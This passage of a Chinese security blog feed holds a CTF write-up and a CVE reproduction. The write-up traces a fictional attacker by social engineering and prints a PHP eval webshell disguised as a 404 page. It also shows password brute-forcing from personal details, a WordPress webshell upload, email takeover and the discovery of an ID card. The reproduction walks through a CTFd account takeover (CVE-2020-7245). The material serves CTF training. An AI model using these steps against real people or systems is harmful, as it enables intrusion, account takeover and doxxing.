        <content type="html"><![CDATA[<h2 id="PCCTF热身赛—溯源-amp-社工类题目解析"><a href="#PCCTF热身赛—溯源-amp-社工类题目解析" class="headerlink" title="PCCTF热身赛—溯源&amp;社工类题目解析"></a>PCCTF热身赛—溯源&amp;社工类题目解析</h2><blockquote><p>题目从最初设计发生了变化，本来想的是单纯的社工题，后来越走越偏，就成了溯源&amp;社工。还有就是一开始的思路是对网站管理员进行社工等操作，后来思考了很久，感觉既然网站管理员的网站都已经被入侵了，是受害者，那倒不如将思路放在网站管理员对黑客进行社工信息收集与溯源一类的操作。</p></blockquote><h2 id="故事背景："><a href="#故事背景：" class="headerlink" title="故事背景："></a>故事背景：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明是XX公司的运维实习生之一，最近由他负责运维的论坛被黑客入侵并且留下了后门，具体利用了哪些漏洞和方法未知。小明发现后立即将网站源码进行了备份，打算分析出后门文件位置，从而进一步进行分析溯源，从此开始了后续的一系列操作。</span><br></pre></td></tr></table></figure><h2 id="人物刻画："><a href="#人物刻画：" class="headerlink" title="人物刻画："></a>人物刻画：</h2><p><strong>受害者公司</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">姓名：小明</span><br><span class="line"></span><br><span class="line">性别：男</span><br><span class="line"></span><br><span class="line">岗位：某公司BBS运维实习生之一</span><br><span class="line"></span><br><span class="line">技术：懂一点Linux技术，编程语言php，html入门，有很强的上进心，积极参与各类活动，对所谓的&quot;黑客技术&quot;有一颗执迷的心。</span><br><span class="line"></span><br><span class="line">学历：本科毕业</span><br></pre></td></tr></table></figure><p><strong>黑客(攻击者)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">背景：伪hacker，俗称骗子，曾经就骗过消费者被公开骂，号称专业查杀网站后门，提供黑客技术，专业查各大网站、论坛、贴吧发帖人ip地址信息，定位跟踪手机，包找到人！专业！高效！保密！诚信！</span><br><span class="line"></span><br><span class="line">姓名：*玉</span><br><span class="line"></span><br><span class="line">地址：浙江省杭州市西湖区西湖花园</span><br><span class="line"></span><br><span class="line">经纬度：120.112972,30.18825</span><br><span class="line"></span><br><span class="line">身份证号：330106199409******</span><br><span class="line"></span><br><span class="line">代理ip：39.97.***.**</span><br><span class="line"></span><br><span class="line">真实ip：218.72.111.***</span><br><span class="line"></span><br><span class="line">支付宝帐号：131610*****</span><br><span class="line"></span><br><span class="line">QQ：31833****</span><br><span class="line"></span><br><span class="line">常用ID：okkio09</span><br><span class="line"></span><br><span class="line">生日：1994/09/25</span><br><span class="line"></span><br><span class="line">blog：http://39.97.***.**:8000/</span><br><span class="line"></span><br><span class="line">常用密码：****u1994925</span><br><span class="line"></span><br><span class="line">邮箱：https://www.2980.com</span><br><span class="line"></span><br><span class="line">账号：okkio09@2980.com</span><br><span class="line">密码：Pa***19940925</span><br><span class="line"></span><br><span class="line">假邮箱：okkio09@163.com</span><br></pre></td></tr></table></figure><h2 id="题解部分："><a href="#题解部分：" class="headerlink" title="题解部分："></a>题解部分：</h2><h3 id="1-被黑的网站："><a href="#1-被黑的网站：" class="headerlink" title="1.被黑的网站："></a>1.被黑的网站：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">小明是XX公司的运维实习生之一，最近由他负责运维的论坛被黑客入侵并且留下了后门，具体利用了哪些漏洞和方法未知。小明发现后立即将网站源码进行了备份，打算分析出后门文件位置，从而进一步进行分析溯源，你能帮帮小明吗？</span><br><span class="line"></span><br><span class="line">tips：</span><br><span class="line">flag为黑客id的md5值，格式pcctf&#123;***&#125;</span><br><span class="line">backup</span><br><span class="line">寻找网站根目录的备份文件</span><br><span class="line">也许是隐藏的。</span><br></pre></td></tr></table></figure><p>BBS首页</p><p><img src="/img/2020/06/30/H469f347267db42bc8039df84da133f1by.jpg" alt></p><p>根据提示知，题目入口是找到这个论坛网站根目录的备份文件，提示 backup 和隐藏文件，猜想到文件名有可能是<code>.backup.xxx</code></p><p>在Linux下的压缩文件后缀名常用的就几个，比如:<code>.tar|.tar.gz|.tgz|.zip|.7z</code></p><p>尝试<code>.backup.tar.gz</code>成功下载到备份文件</p><p><img src="/img/2020/06/30/H921911894817435d81013736106d71d8c.jpg" alt></p><p>题目提示让分析出后门文件位置，所以直接拿D盾 webshell 查杀工具扫一下看看有没有 webshell</p><p><img src="/img/2020/06/30/Ha5345539f49e44bd832919c0e3148a2fT.jpg" alt></p><p>404 webshell 后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">@eval($_POST[&quot;Bugs2020&quot;]);</span><br><span class="line"></span><br><span class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</span><br><span class="line"></span><br><span class="line">/*Hacker by okkio09</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由 php 注释中得到hack的id为：<code>okkio09</code></p><p>md5 加密一下拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcctf&#123;12060a2df71ea1c7764141ee4eb0593c&#125;</span><br></pre></td></tr></table></figure><h3 id="2-小明的反击："><a href="#2-小明的反击：" class="headerlink" title="2.小明的反击："></a>2.小明的反击：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据之前得到的信息，对该黑客的博客进行破解。</span><br><span class="line"></span><br><span class="line">tips：</span><br><span class="line">flag为博客密码的md5值，提交格式pcctf&#123;***&#125;</span><br><span class="line">黑客的博客即为他的代理ip。</span><br></pre></td></tr></table></figure><p>说到代理ip，不难想到可能会跟hack的登录相关，因为是bbs论坛网站，所以后台应该会有登录日志和发帖日志等，这些功能有可能会对ip地址进行记录。</p><p>Cknife连接一句话</p><p><img src="/img/2020/06/30/H72a7bfab4985446bbafb22724c8a5ad7V.jpg" alt></p><p>配置文件拿到数据库连接账号密码</p><p><code>/var/www/html/conf/conf.php</code></p><p><img src="/img/2020/06/30/H108263c89e4a4da79e28fe0df51073f4X.jpg" alt></p><p>连接数据库找到用户信息，可以看到是加盐的密码，所以应该不容易解出</p><p><img src="/img/2020/06/30/H140d430104574776b2b7ed3d1aa3f1d0i.jpg" alt></p><p>继续往后翻发现真的有 ip 字段</p><p><img src="/img/2020/06/30/H7138abb208ac4dba9fdfecc6695ab437H.jpg" alt></p><p>创建ip以及登录ip信息，接着我们只需找到<code>okkio09</code>这个id的登录ip即可，而且还顺利的拿到了他的qq号。</p><p><img src="/img/2020/06/30/Haad73d984d7d4836b90670278d3d9527j.jpg" alt></p><p>ip信息被转换为了长整型数据，解一下即可，需要用php的<code>long2ip()</code>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = &apos;******378&apos;;</span><br><span class="line">echo long2ip($ip);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解出之后拿到代理ip，题目提示代理ip即为博客ip</p><p><img src="/img/2020/06/30/H897ddd1f622f4378848e0f0b2be63e17B.jpg" alt></p><p>访问该ip无任何反应，但是可以ping通，此时应该朝着端口方向猜想，nmap 扫到8000端口，访问就是他的博客。</p><p><img src="/img/2020/06/30/Hd9738ab73b134ba69bdeacec58b6eab54.jpg" alt></p><p><img src="/img/2020/06/30/H58448fe41674432b894e549a5f34baceO.jpg" alt></p><p>博客使用wordpress搭建，默认后台地址：<code>http://39.97.***.**:8000/wp-login.php</code></p><p>获取更多的信息来制作社工字典，对博客后台进行爆破。</p><p>目前已知信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID:okkio09</span><br><span class="line"></span><br><span class="line">qq:31833****</span><br></pre></td></tr></table></figure><p>看来只能通过加qq看看能不能获取到更多的信息。</p><p>添加时需要回答问题，只需找点理由（业务相关，定位人等等）就能顺利通过。</p><p><img src="/img/2020/06/30/H8c6ae1fb732b4d5a95ac8bd8ce07b01bG.jpg" alt></p><p>空间中发现该名hack曾换过手机号，并且把新手机号也发了出来，get到手机号。</p><p><img src="/img/2020/06/30/H2013073c96fa4435a48ee9bd01c98391Z.jpg" alt></p><p>查看详细资料得到出生年月。</p><p><img src="/img/2020/06/30/Hcab600b2e5994c369c5152339c1d59b5r.jpg" alt></p><p>利用得到的手机号去支付宝进行转账，然后对姓名进行校验，看看能不能得到真的名字。</p><p>名字为两个字，比较容易猜（为了降低难度，百度直接搜索手机号也会得到很多信息，包括真实姓名等）</p><p><img src="/img/2020/06/30/H6644a0858e7a4954a6fb2ee6c2702fcaH.jpg" alt></p><p>下面整理一下得到的有用的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID:okkio09</span><br><span class="line">qq:31833****</span><br><span class="line">手机:131610*****</span><br><span class="line">生日:1994/09/25</span><br><span class="line">真实姓名:*玉</span><br><span class="line">姓名拼音:***yu</span><br></pre></td></tr></table></figure><p>利用这些信息生成组合密码，对 hack 的博客后台进行爆破</p><p>爆破成功，发现后台密码为：姓名拼音+出生年月</p><p><img src="/img/2020/06/30/Hc48b1fc7954f45709fa75f0717faad79X.jpg" alt></p><p>flag为博客密码的md5值，提交格式<code>pcctf{***}</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcctf&#123;2543e4ab****************bcb5b42d&#125;</span><br></pre></td></tr></table></figure><h3 id="3-继续分析："><a href="#3-继续分析：" class="headerlink" title="3.继续分析："></a>3.继续分析：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">经过一番分析与溯源，你已经有一些成果了，那么请你找出该黑客的真实ip地址。</span><br><span class="line"></span><br><span class="line">tips：</span><br><span class="line">flag为黑客真实ip的md5值，提交格式pcctf&#123;***&#125;</span><br><span class="line">想想黑客会用真实ip登录什么。</span><br></pre></td></tr></table></figure><p>hack博客的后台前面已经拿下，接下来想办法拿shell</p><p><strong>方法很多，以简单的为例：</strong></p><p>wordpress插件位置直接上传<code>.php</code>文件，虽然会提示安装失败，但是会直接保存到<code>/wp-content/uploads/年份/月份/目录</code>下，并且可以解析。</p><p><img src="/img/2020/06/30/H7bebecb615d348e49a2ff5e3324a3f10r.jpg" alt></p><p><img src="/img/2020/06/30/H74c2f8ce94df4930b8d3e8ab7eaa9758F.jpg" alt></p><p>直接上传一个一句话，拿到shell(这里需要主要php的版本)</p><p><img src="/img/2020/06/30/H1462d2e0cb024592a879a247c5d7adcbU.jpg" alt></p><p>根据该题目提示，flag为黑客真实ip的md5值，想想黑客会用真实ip登录什么。</p><p>登录的功能记录ip地址还挺多的，比如登录wp后台，登录ssh服务等等，这里直接查一下<code>/var/log/secure</code>文件，取证中比较常见。</p><p>很多记录都是内网的ip，但是还是找到了两条蛛丝马迹。</p><p><img src="/img/2020/06/30/H0b56857cc75e4bb8912065ca7a3fb7beT.jpg" alt></p><p>真实ip:<code>218.72.111.***</code></p><p>经md5加密后即为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcctf&#123;0830f1be****************82bf15dde&#125;</span><br></pre></td></tr></table></figure><h3 id="4-一步之遥："><a href="#4-一步之遥：" class="headerlink" title="4.一步之遥："></a>4.一步之遥：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">距离成功就差一步了，请你继续进行溯源，并写出黑客所在地的具体位置</span><br><span class="line"></span><br><span class="line">tips：</span><br><span class="line">flag为黑客真实所在地位置拼音的md5值（例：泰山学院即&quot;taishanxueyuan&quot;，并转为md5），提交格式pcctf&#123;***&#125;</span><br><span class="line">用户目录</span><br><span class="line">和邮箱有关</span><br></pre></td></tr></table></figure><p>题目说是位置信息，前面拿到了真实ip，但是该ip查不到具体位置，遂放弃。</p><p>本题提示与邮箱有关，在小明的BBS中查到了hack的注册邮箱，但是这个邮箱是假的。</p><p><img src="/img/2020/06/30/H389074cfb8024109a255308c297b2dc54.jpg" alt></p><p>于是去hack的博客找找，最终发现真实邮箱为：<code>okkio09@2980.com</code></p><p><img src="/img/2020/06/30/Hc0722cbbc48a4da0a81e0110fcfa4837I.jpg" alt></p><p>又提示用户目录，所以用shell看看，发现<code>/home/okkio09/</code>目录下有一个隐藏文件<code>.smtp</code>，猜想可能是smtp配置文件备份，拿到密码。</p><p><img src="/img/2020/06/30/Hd51cc1f9e0114b198d4dcc10fb532bc9y.jpg" alt></p><p><img src="/img/2020/06/30/H2f7d7b8baa1b4194b6c957ac8613ba63O.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">email</span><br><span class="line">okkio09@2980.com</span><br><span class="line">pass</span><br><span class="line">***Yu19940925</span><br></pre></td></tr></table></figure><p>登录邮箱寻找关键信息</p><p>登录发现此邮箱被轰炸过，收件箱有大量邮件，索性去发件箱看看</p><p>看到此hack曾给某人发过图片，还是打包发送的，所以exif可能会泄露位置信息。</p><p><img src="/img/2020/06/30/H00c0990921134ac581d2f34c6377ffccA.jpg" alt></p><p>将附件下载下来在进行分析。</p><p>解压后发现是三张可爱的小猫照片。</p><p><img src="/img/2020/06/30/H0b9f1c61025949c8aaa86eeb7263ee50h.jpg" alt></p><p>拖进EXIF信息查看器分析</p><p><code>https://exif.tuchong.com/</code></p><p>果然顺利拿到GPS信息，经纬度</p><p><img src="/img/2020/06/30/Hfcbed97c7b08472e85a078319c45cac5G.jpg" alt></p><p>需要进行经纬度转换成为度分秒，然后坐标反查</p><p>经纬度转换成为度分秒：<code>http://www.gzhatu.com/du2dfm.html</code></p><p>纬度：</p><p><img src="/img/2020/06/30/H79eeb4a5b334473c9e79651b35dd4bf39.jpg" alt></p><p>经度：</p><p><img src="/img/2020/06/30/Hfdd14c64cf714280a27b93855e86a56cn.jpg" alt></p><p>坐标拾取/坐标反查：<code>http://api.map.baidu.com/lbsapi/getpoint/</code></p><p>经纬度：<code>120.112972,30.18825</code></p><p>直接精确的定位到西湖花园</p><p><img src="/img/2020/06/30/H42834a3fe7b343a7839db6d659aa256az.jpg" alt></p><p>flag为<code>xihuhuayuan</code>的md5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcctf&#123;d47fd3629a44f3f81cddeabbefc0368e&#125;</span><br></pre></td></tr></table></figure><h3 id="5-抓到你了："><a href="#5-抓到你了：" class="headerlink" title="5.抓到你了："></a>5.抓到你了：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">干的不错，到此就对黑客有了大致的了解，既然你已经get到了这么多有用的信息，那么就把黑客的身份证号贴出来吧。</span><br><span class="line"></span><br><span class="line">tips：</span><br><span class="line">flag为黑客的身份证号的md5值，提交格式pcctf&#123;***&#125;</span><br><span class="line">和网盘有关。</span><br></pre></td></tr></table></figure><p>除了提示网盘，没有任何提示，所以感觉可能会有身份证信息存在了网盘里。</p><p>翻邮件看看都注册了哪些网站，在末尾发现曾经注册过NextCloud</p><p><img src="/img/2020/06/30/Ha0d9d41796d046a7948223abc8bc3b0fF.jpg" alt></p><p><img src="/img/2020/06/30/H0149573b1b9845549b5454122e5718b50.jpg" alt></p><p>继续访问，用之前得到的密码测试了一下，发现并不能登录。</p><p>下方发现找回密码功能，既然不知道密码，直接重置掉就好。</p><p><img src="/img/2020/06/30/H32fac4ba96b54784a6f36c03c418bda71.jpg" alt></p><p><img src="/img/2020/06/30/Ha319eccdb0444265a22c446ec55d51ffM.jpg" alt></p><p><img src="/img/2020/06/30/Hde2465ed8ee043c9a6c81a3a078231c14.jpg" alt></p><p><img src="/img/2020/06/30/H680870173a9e4b31bbae24b6368f1cd2J.jpg" alt></p><p><img src="/img/2020/06/30/Hd1e40041ad904d9d8b2c2c622f912428u.jpg" alt></p><p>寻找一番，最终在Photos目录中发现身份证照片。</p><p><img src="/img/2020/06/30/H3ed77a97ee3b43cc890997c0676bc47am.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag为身份证号的md5</span><br><span class="line"></span><br><span class="line">pcctf&#123;0d6871cb83e************54095e5a6&#125;</span><br></pre></td></tr></table></figure><blockquote><p>此次题目是针对19级学弟，其实题目本身并不难，都是一些基础操作。重要的是对此次事件整个流程的思考，思路，要学会转变思维，以一个hack的角度对待问题。</p><p>另外此次的赛题并不细腻，比如一开始打算利用备案信息来获取到身份证号等等，后来因为某些因素放弃。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 社会工程 </tag>
            
            <tag> 溯源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-7245（CTFd账户接管漏洞）复现</title>
      <link href="/2020/06/10/CVE-2020-7245/"/>
      <url>/2020/06/10/CVE-2020-7245/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-7245（CTFd账户接管漏洞）复现"><a href="#CVE-2020-7245（CTFd账户接管漏洞）复现" class="headerlink" title="CVE-2020-7245（CTFd账户接管漏洞）复现"></a>CVE-2020-7245（CTFd账户接管漏洞）复现</h1><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>在CTFd v2.0.0-v2.2.2的注册过程中，错误的用户名验证方式会允许攻击者接管任意帐户，前提是用户名已知并且在CTFd平台上启用了电子邮件功能。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p><strong>CTFd v2.0.0版本注册部分的代码</strong></p><p><code>CTFd/CTFd/auth.py#159</code></p><p><code>CTFd/CTFd/auth.py#207</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">159 def register():</span><br><span class="line">160     errors = get_errors()</span><br><span class="line">161     if request.method == &quot;POST&quot;:</span><br><span class="line">162         name = request.form[&quot;name&quot;]</span><br><span class="line">163         email_address = request.form[&quot;email&quot;]</span><br><span class="line">164         password = request.form[&quot;password&quot;]</span><br><span class="line">165</span><br><span class="line">166         name_len = len(name) == 0</span><br><span class="line">167         names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()</span><br><span class="line">168         emails = (</span><br><span class="line">169             Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)</span><br><span class="line">170             .filter_by(email=email_address)</span><br><span class="line">171             .first()</span><br><span class="line">172         )</span><br><span class="line">173         pass_short = len(password) == 0</span><br><span class="line">174         pass_long = len(password) &gt; 128</span><br><span class="line">175         valid_email = validators.validate_email(request.form[&quot;email&quot;])</span><br><span class="line">176         team_name_email_check = validators.validate_email(name)</span><br><span class="line"># 省略部分代码</span><br><span class="line">207         else:</span><br><span class="line">208             with app.app_context():</span><br><span class="line">209                 user = Users(</span><br><span class="line">210                     name=name.strip(),</span><br><span class="line">211                     email=email_address.lower(),</span><br><span class="line">212                     password=password.strip(),</span><br><span class="line">213                 )</span><br></pre></td></tr></table></figure><p>可以看到用户注册时name参数并未经过任何处理，判断用户名是否重复时使用的就是没有经过任何处理的name值，然而存入数据库时却将这个name值做了 <code>strip</code>处理，去掉name值首尾的空字符。</p><p>这就意味着只要注册一个首尾添加空格的用户名即可绕过用户名不能重复的限制。</p><p><strong>CTFd v2.0.0版本找回密码部分的代码</strong></p><p><code>CTFd/CTFd/auth.py#95</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> 95 @auth.route(&quot;/reset_password&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])</span><br><span class="line"> 96 @auth.route(&quot;/reset_password/&lt;data&gt;&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])</span><br><span class="line"> 97 @ratelimit(method=&quot;POST&quot;, limit=10, interval=60)</span><br><span class="line"> 98 def reset_password(data=None):</span><br><span class="line"> 99     if data is not None:</span><br><span class="line">100         try:</span><br><span class="line">101             name = unserialize(data, max_age=1800)</span><br><span class="line">102         except (BadTimeSignature, SignatureExpired):</span><br><span class="line">103             return render_template(</span><br><span class="line">104                 &quot;reset_password.html&quot;, errors=[&quot;Your link has expired&quot;]</span><br><span class="line">105             )</span><br><span class="line">106         except (BadSignature, TypeError, base64.binascii.Error):</span><br><span class="line">107             return render_template(</span><br><span class="line">108                 &quot;reset_password.html&quot;, errors=[&quot;Your reset token is invalid&quot;]</span><br><span class="line">109             )</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112             return render_template(&quot;reset_password.html&quot;, mode=&quot;set&quot;)</span><br><span class="line">113         if request.method == &quot;POST&quot;:</span><br><span class="line">114             user = Users.query.filter_by(name=name).first_or_404()</span><br><span class="line">115             user.password = request.form[&quot;password&quot;].strip()</span><br><span class="line">116             db.session.commit()</span><br><span class="line">117             log(</span><br><span class="line">118                 &quot;logins&quot;,</span><br><span class="line">119                 format=&quot;[&#123;date&#125;] &#123;ip&#125; -  successful password reset for &#123;name&#125;&quot;,</span><br><span class="line">120                 name=name,</span><br><span class="line">121             )</span><br><span class="line">122             db.session.close()</span><br><span class="line">123             return redirect(url_for(&quot;auth.login&quot;))</span><br></pre></td></tr></table></figure><p>大致可以理解为找回密码时从链接参数中取data值，将其反序列化后获得用户名，即可重置任意用户的密码。</p><p><strong>利用该漏洞需要以下几步：</strong></p><ul><li>利用首尾添加空格绕过限制，注册一个与受害者用户名相同的账号</li><li>找回密码链接发送到自己的邮箱</li><li>修改自己账号的用户名（与受害者不同）</li><li>点击重置密码链接，设置新密码</li></ul><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>V&amp;N 2020公开赛HappyCTFd原题，buuoj有对应的环境。</p><p><strong>具体操作主要分为以下几步：</strong></p><ul><li><p>先在buuoj注册个邮箱</p></li><li><p>利用首尾添加空格绕过限制来注册一个与受害者用户名相同的账号</p></li><li><p>找回密码链接发送到自己的邮箱</p></li><li><p>修改自己账号的用户名（与受害者不同）</p></li><li><p>点击重置密码链接，设置新密码</p></li></ul><p>由于buuoj靶机无法访问外网，所以需要在buuoj的邮件系统注册邮箱。</p><blockquote><p><a href="http://mail.buuoj.cn/admin/ui/user/signup/mail.buuoj.cn" target="_blank" rel="noopener">http://mail.buuoj.cn/admin/ui/user/signup/mail.buuoj.cn</a> </p></blockquote><p><img src="/img/2020/06/10/H4b2b573f3a584c6a854f26148728e336H.jpg" alt></p><p>然后我们访问靶机地址，发现该ctfd平台有一个admin账号，所以我们尝试重置admin账号的密码。</p><p><img src="/img/2020/06/10/H9572b7e861ed463b86d77e88becbd00dI.jpg" alt></p><p>首先注册一个首或者尾带空格的<code>admin</code>账号，邮箱需要设置正确。</p><p><img src="/img/2020/06/10/H58311d79b60e41f5ac1fed3c772191eaG.jpg" alt></p><p>注册成功可以发现自己后台的用户名首尾并没有空格。</p><p><img src="/img/2020/06/10/H3c2d6986a108468b93ab6d635626d8ebZ.jpg" alt></p><p>然后尝试重置admin密码，浏览器另外开一个页面，输入自己注册账号的邮箱，获取重置密码链接。</p><p><img src="/img/2020/06/10/H56fb94fab964432e9eeaa9dbc94007c1Z.jpg" alt></p><p>在收件箱中收到重置密码链接后，先不要操作，需要去用户后台页面修改用户名（任意）。</p><p><img src="/img/2020/06/10/Hdb73580caa974ab0bc85fb09eb2e19eaf.jpg" alt></p><p>修改完自己的用户名直接点击重置密码链接，对admin账号进行密码重置，设置一个你想要的密码。</p><p>再次用admin和你设置的密码登录，就成功拿到了超级管理员权限。</p><p><img src="/img/2020/06/10/H475aefed6776444db2d78e28aa177107q.jpg" alt></p><p>flag在challenges里面找一下，发现有个”flagflag你在哪”的挑战，打开后找到一个”miaoflag.txt”的附件，即flag。</p><p><img src="/img/2020/06/10/H68486da9b0a844a7a07556b0fc94257f7.jpg" alt></p><h2 id="0x04-漏洞修补"><a href="#0x04-漏洞修补" class="headerlink" title="0x04 漏洞修补"></a>0x04 漏洞修补</h2><p>更新CTFd为最新版即可。</p><p><strong>参考链接：</strong></p><blockquote><p> <a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/amp/</a> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记4月5日360众测考核</title>
      <link href="/2020/04/05/360-zhongce/"/>
      <url>/2020/04/05/360-zhongce/</url>
      
